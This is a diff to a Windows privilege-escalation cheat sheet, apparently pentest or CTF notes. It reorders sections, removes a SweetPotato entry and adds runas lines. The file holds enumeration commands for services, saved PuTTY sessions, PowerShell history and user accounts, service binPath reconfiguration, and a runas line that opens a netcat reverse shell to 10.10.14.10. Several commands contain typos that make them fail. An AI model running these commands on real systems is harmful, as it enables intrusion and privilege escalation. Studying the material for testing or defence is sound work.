@@ -16,6 +16,74 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>$null
 Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -ErrorAction SilentlyContinue
 ```
 
+
+>Service Commands
+```sh
+Get-Service
+
+Get-Service | Select-Object Displayname,Status,ServiceName
+
+Get-CimInstance -ClassName win32_service | Select,State,PathName
+
+#queries the configuration of a Windows service. 
+#use in cmd sc
+sc qeury | findstr "soemthing"
+
+sc qc "something"
+
+# service create
+sc create SimpleService binPath="C:\TEMP"
+
+# service config
+sc config <service> binPath="C:\TEMP"
+
+# service permission
+sc sdshow <service>
+
+# since sdshow shows SDDL which is hard to read use this bin to read it better 
+ConvertFrom-SddlString -Sddl <SDDL>
+
+Get-Service * | Select-Object Displayname,Status,ServiceName, Can*
+
+
+Start <Service>
+Stop <Service>
+```
+
+```sh
+#NSSM ->  service manager
+nssm.exe install <service-name>
+```
+
+
+>Process Commands
+```sh
+#recursive search in cmd
+dir /s /b *.txt
+
+#recursive search in powershell
+Get-ChildItem -Recurse -Filter '*.txt' -ErrorAction SilentyContinue
+
+#installed aps
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
+
+
+#what users we have
+net user
+net user <User>
+
+#check users in the domain
+net user /domain
+net user <user> /domain
+
+#auth Checks
+icalcs <file>
+
+# Grant Permissions
+icalcs  test.txt /grant hostname\username:R /t /c
+```
+
+
 ```sh
 
 # 1.enable rdp
@@ -64,20 +132,6 @@ check file permessions
 ```ls
 .\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
 ```
-#### SweetPotato
-
-`https://github.com/CCob/SweetPotato `
-
-A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM
-
-if we have in the userPriv impersonation enabled we can use this tool to exploit it 
-
-```
-sweet.exe -e [exploit mode] '[payload binary]'
-
-payload bindary = reverse tcp shell 
-```
-
 
 #### WinPeas
 
@@ -91,78 +145,6 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args log
 ```
 
 
->Service Commands
-```sh
-Get-Service
-
-Get-Service | Select-Object Displayname,Status,ServiceName
-
-Get-CimInstance -ClassName win32_service | Select,State,PathName
-
-#queries the configuration of a Windows service. 
-#use in cmd sc
-sc qeury | findstr "soemthing"
-
-sc qc "something"
-
-# service create
-sc create SimpleService binPath="C:\TEMP"
-
-# service config
-sc config <service> binPath="C:\TEMP"
-
-# service permission
-sc sdshow <service>
-
-# since sdshow shows SDDL which is hard to read use this bin to read it better 
-ConvertFrom-SddlString -Sddl <SDDL>
-
-Get-Service * | Select-Object Displayname,Status,ServiceName, Can*
-
-
-Start <Service>
-Stop <Service>
-```
-
-```sh
-#NSSM ->  service manager
-nssm.exe install <service-name>
-```
-
->RunAs
-```sh
-#spawns a shell with specific user 
-runas /netonly /users:USER1 cmd
-```
-
-
->Process Commands
-```sh
-#recursive search in cmd
-dir /s /b *.txt
-
-#recursive search in powershell
-Get-ChildItem -Recurse -Filter '*.txt' -ErrorAction SilentyContinue
-
-#installed aps
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
-
-
-#what users we have
-net user
-net user <User>
-
-#check users in the domain
-net user /domain
-net user <user> /domain
-
-#auth Checks
-icalcs <file>
-
-# Grant Permissions
-icalcs  test.txt /grant hostname\username:R /t /c
-```
-
 #### UserSwitch 
 
 
@@ -174,14 +156,17 @@ Execute a command in **Runas**
 
 ```shell
 C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe -e cmd.exe 10.10.14.10 1337"
+
+#spawns a shell with specific user 
+runas /netonly /users:<domain\USER> cmd
 ```
 
 
+```sh
 
 https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
 
 
-```shell
 Invoke-RunasCs svc_mssql trustno1 'cmd.exe /c whoami'
 ```
 
